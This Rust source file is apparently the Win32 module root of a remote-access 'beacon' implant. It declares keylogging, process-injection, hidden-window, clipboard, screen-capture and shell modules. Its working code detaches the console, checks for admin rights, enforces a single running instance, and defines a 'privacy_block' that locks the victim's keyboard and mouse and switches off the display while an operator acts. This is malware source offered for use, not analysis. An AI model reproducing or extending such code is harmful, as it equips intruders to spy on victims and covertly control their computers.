//! Minimal Win32 bindings used by the beacon. Everything here is `cfg(windows)`.

pub mod clipboard;
pub mod hidden;
pub mod inject;
pub mod input;
pub mod keylog;
pub mod process;
pub mod screen;
pub mod shell;

use std::ffi::c_void;

use windows_sys::Win32::{
    Foundation::{CloseHandle, HANDLE},
    Security::{GetTokenInformation, TOKEN_ELEVATION, TOKEN_QUERY, TokenElevation},
    System::Console::FreeConsole,
    System::Threading::{CreateMutexW, GetCurrentProcess, OpenProcessToken},
};

pub fn wide(value: &str) -> Vec<u16> {
    value.encode_utf16().chain(std::iter::once(0)).collect()
}

pub fn free_console() {
    unsafe {
        FreeConsole();
    }
}

pub fn is_admin() -> bool {
    unsafe {
        let mut token: HANDLE = std::ptr::null_mut();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 {
            return false;
        }
        let mut elevation = TOKEN_ELEVATION { TokenIsElevated: 0 };
        let mut returned = 0u32;
        let ok = GetTokenInformation(
            token,
            TokenElevation,
            &mut elevation as *mut _ as *mut c_void,
            std::mem::size_of::<TOKEN_ELEVATION>() as u32,
            &mut returned,
        );
        CloseHandle(token);
        ok != 0 && elevation.TokenIsElevated != 0
    }
}

/// Returns the mutex handle when this process owns the name. `None` means
/// another instance is already running or the mutex could not be created.
pub fn acquire_mutex(name: &str) -> Option<HANDLE> {
    let name = wide(name);
    unsafe {
        let handle = CreateMutexW(std::ptr::null(), 1, name.as_ptr());
        if handle.is_null() {
            return None;
        }
        const ERROR_ALREADY_EXISTS: u32 = 183;
        if windows_sys::Win32::Foundation::GetLastError() == ERROR_ALREADY_EXISTS {
            CloseHandle(handle);
            return None;
        }
        Some(handle)
    }
}

/// Blocks physical input and powers the display off. The Go agent mirrors this
/// with a topmost black window; the effect for the operator is the same.
pub fn privacy_block(enabled: bool) {
    use windows_sys::Win32::UI::{
        Input::KeyboardAndMouse::BlockInput,
        WindowsAndMessaging::{
            SendMessageW, HWND_BROADCAST, SC_MONITORPOWER, WM_SYSCOMMAND,
        },
    };
    unsafe {
        BlockInput(if enabled { 1 } else { 0 });
        SendMessageW(
            HWND_BROADCAST,
            WM_SYSCOMMAND,
            SC_MONITORPOWER as usize,
            if enabled { 2 } else { -1 },
        );
    }
}
